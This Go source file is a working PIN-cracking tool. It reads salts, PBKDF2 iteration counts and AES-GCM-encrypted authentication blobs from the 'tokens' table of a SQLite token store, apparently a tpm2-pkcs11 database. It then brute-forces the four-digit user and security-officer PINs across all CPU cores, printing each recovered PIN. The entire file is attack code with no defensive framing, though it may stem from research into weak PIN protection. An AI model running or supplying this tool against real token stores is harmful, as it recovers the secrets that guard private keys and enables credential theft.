package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

type store struct {
	salt  string
	iters int
	auth  string
}

func main() {
	db, err := sql.Open("sqlite3", os.Args[1])
	if err != nil {
		log.Fatal(err)
	}

	rows, err := db.Query("SELECT label, userpobjauthkeysalt, userpobjauthkeyiters, userpobjauth, sopobjauthkeysalt, sopobjauthkeyiters, sopobjauth FROM tokens")
	if err != nil {
		log.Fatal(err)
	}

	var label string
	var user, so store
	for rows.Next() {
		err := rows.Scan(
			&label,
			&user.salt, &user.iters, &user.auth,
			&so.salt, &so.iters, &so.auth,
		)
		if err != nil {
			log.Fatal(err)
		}

		user.brute(label, "user", 4)
		so.brute(label, "so", 4)
	}
}

func (s *store) brute(label, role string, digits int) {
	start := time.Now()
	fmt.Printf("Brute forcing %s PIN for %s...\n", role, label)

	salt := unhex(s.salt)

	fields := strings.SplitN(s.auth, ":", 3)
	nonce := unhex(fields[0])
	ciphertext := append(unhex(fields[2]), unhex(fields[1])...)

	max := 1
	for i := 0; i < digits; i++ {
		max *= 10
	}

	var done uint32
	result := make(chan []byte)
	workers := runtime.GOMAXPROCS(0)

	for i := 0; i < workers; i++ {
		i := i
		go func() {
			pin := make([]byte, 1+digits)
			for j := range pin {
				pin[j] = '0'
			}

			for ; i < max && atomic.LoadUint32(&done) == 0; i += workers {
				strconv.AppendInt(pin[:0], int64(max+i), 10)
				if guess(pin[1:], salt, s.iters, nonce, ciphertext) {
					result <- pin[1:]
					return
				}
			}
		}()
	}

	pin := <-result
	atomic.StoreUint32(&done, 1)

	fmt.Printf("%s PIN: %s (time %v)\n", role, string(pin), time.Since(start))
}

func guess(pin, salt []byte, iters int, nonce, ciphertext []byte) bool {
	key := pbkdf2.Key(pin, salt, iters, sha256.Size, sha256.New)
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err)
	}

	_, err = aesgcm.Open(nil, nonce, ciphertext, nil)
	return err == nil
}

func unhex(s string) []byte {
	res, err := hex.DecodeString(s)
	if err != nil {
		log.Fatal(err)
	}
	return res
}
